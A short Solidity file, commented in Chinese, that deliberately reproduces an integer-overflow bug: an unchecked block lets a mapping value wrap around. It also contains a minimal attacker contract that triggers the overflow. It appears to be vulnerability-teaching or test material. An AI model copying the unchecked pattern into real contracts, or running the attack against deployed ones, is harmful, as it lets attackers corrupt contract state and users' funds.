pragma solidity >=0.8.0;

// 漏洞程式碼：Integer Overflow (使用 unchecked 區塊
// 在 Solidity 0.8.0 以上版本中，預設會做 overflow 檢查，但此處故意使用 unchecked 來重現漏洞情境

contract IntegerOverflowMappingSym1Vuln {
    // 漏洞重點：map 狀態變數無 overflow 檢查
    mapping(uint256 => uint256) public map;

    // 漏洞函式：init，利用 unchecked 區塊造成加法 overflow 問題
    function init(uint256 k, uint256 v) public {
        // 使用 unchecked 區塊，忽略溢位檢查
        unchecked {
            // 漏洞：map[k] 原本的值加上傳入的 v，可能會因為 overflow 而回繞
            map[k] += v;
        }
    }
}

// 攻擊範例說明：
// 假設使用者先讓 map[1] = 2**256 - 10，接著呼叫 init(1, 20) 將導致溢位 (overflow)，使得 map[1] 的值回繞，
// 攻擊者可以利用這個漏洞造成不預期的值變更，從而操控合約內的狀態。
// 以下提供一個攻擊合約利用漏洞進行攻擊的示例:

contract AttackIntegerOverflow {
    IntegerOverflowMappingSym1Vuln public vulnerableContract;

    // 在部署攻擊合約前，必須傳入漏洞合約的位址
    constructor(address _vulnerableAddress) {
        vulnerableContract = IntegerOverflowMappingSym1Vuln(_vulnerableAddress);
    }

    // 攻擊步驟：
    // 1. 先由正常使用者呼叫 vulnerableContract.init(1, initialValue) 將 map[1] 設定成接近 uint256 的上限，如 2**256 - 10
    // 2. 然後攻擊者呼叫 attack() 函式觸發溢位，傳入數值使得 map[1] 從一個極大值回繞到小值
    function attack(uint256 k, uint256 overflowValue) public {
        vulnerableContract.init(k, overflowValue);
    }
    // 攻擊者可觀察 vulnerableContract.map(k) 的值，以了解溢位產生的結果
}
